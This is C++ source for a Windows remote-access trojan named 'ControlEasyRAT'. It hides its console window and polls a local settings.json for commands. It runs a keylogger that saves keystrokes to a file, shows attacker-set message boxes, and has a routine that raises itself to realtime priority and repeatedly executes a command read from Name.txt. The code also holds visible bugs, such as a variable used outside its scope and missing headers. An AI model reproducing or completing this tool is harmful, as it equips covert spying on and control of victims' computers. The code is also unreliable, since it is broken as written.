#include <iostream>
#include <windows.h>
#include <fstream>
#include <stdio.h>
#include <string>
#include <sys/stat.h>
#include <nlohmann/json.hpp>

#pragma comment(lib, "ntdll.lib")
#define MessageBox MessageBoxW
using json = nlohmann::json;
using namespace std;
#define EXTERN_C

class rat {
  public:
    json j;
  void keylogger() {
    while (true) {
      if (_kbhit())
        char key = getch();
      ofstream file;
      file.open("fun.txt", ios::app);
      file << key;
      file.close();
      Sleep(100);
    }
  }
  void sShowMessage(string x) {
    char message[256];
    sprintf_s(message, x.c_str());
    MessageBoxA(NULL, message, "Scripteds cool rat tool", MB_ICONERROR);
  }

  void spamram() {
    SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
    while (true) {
      while (true) {
        fstream file;
        string name;
        file.open("Name.txt", ios:: in );
        getline(file, name);
        file.close();
        WaitForSingleObject(GetCurrentProcess(), 0.000000000000000000000001);
        system(name.c_str());
      }
    }
  }

  void rat_main() {
    struct stat st;
    HWND window;
    AllocConsole();
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
    fstream file;
    file.open("settings.json", ios:: in );
    file >> j;
    file.close();
    if (j["started"] == true) {
      ofstream file1("settings.json");
      j["keylogger"] = false;
      j["shutdown"] = false;
      j["show_message"] = "";
      j["slow_comp"] = false;
      j["started"] = false;
      file1 << j;
      file1.close();
    } else;
    while (true) {
      Sleep(1000);
      file.open("settings.json", ios:: in );
      file >> j;
      if (file.is_open()) {
        file.close();
        if (j["keylogger"] == true) {
          file.close();
          keylogger();
          file.open("fun.txt", ios::out);
          file << "";
          file.close();

        } else if (j["show_message"] != "") {
          file.close();
          string text;
          sShowMessage(j["show_message"]);
          j["show_message"] = false;
          ofstream file1("settings.json");
          file1 << j;
          file1.close();
          remove("message.txt");
          file.open("fun.txt", ios::out);
          file << "";
          file.close();
        } else if (j["slow_comp"] == true) {
          spamram();
        }
      }
    }
  }

};

int main(int argc, char * argv[]) {
  system("title ControlEasyRAT Made by Scripted on GitHub");
  rat obj;
  obj.rat_main();

};
